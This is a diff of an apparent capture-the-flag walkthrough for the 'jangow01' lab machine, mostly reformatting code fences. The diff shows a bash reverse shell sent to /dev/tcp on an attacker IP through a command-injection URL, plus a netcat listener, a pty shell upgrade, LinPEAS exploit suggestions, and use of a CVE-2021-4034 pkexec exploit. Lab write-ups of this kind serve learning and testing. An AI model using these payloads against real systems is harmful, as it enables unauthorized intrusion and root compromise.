@@ -26,25 +26,25 @@ after this I can comprimse the FTP server, by having the user and pass of an use
 
 On the command injection vulnerability I applied the following reverse shell script:
 
-''''
+````
 /bin/bash -c 'bash -i >& /dev/tcp/<IP attacker>/<port open by attacker> 0>&1’
-''''
+````
 this command i translate into URL en code:
-''''
+````
 http://IP/site/busque.php?buscar=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP by attacker>%2F<port by attacker>%200%3E%261%27
-''''
+````
 The port on the attacker machine was opened:
-''''
+````
 nc -lvnp <port by attacker>
-''''
+````
 Then I use Python to get access into a shell console:
-
-''''
+````
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-''''
+````
 On the shell, I change the user to jangow01, who we already know the credentials
 
 Usin LinPEAS I got this:
+````
 -rwsr-xr-x 1 root root 23K Jan 17  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)        
 
 [+] [CVE-2017-16995] eBPF_verifier
@@ -245,8 +245,9 @@ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   [3] get_rekt
       CVE-2017-16695
       Source: http://www.exploit-db.com/exploits/45010
+````
 
-I ran:
+I ran cve-2021-4034 :
 https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c
 getting the C file on the attacker machine and FTP into the vulnerable machine. I just run 
 ''''
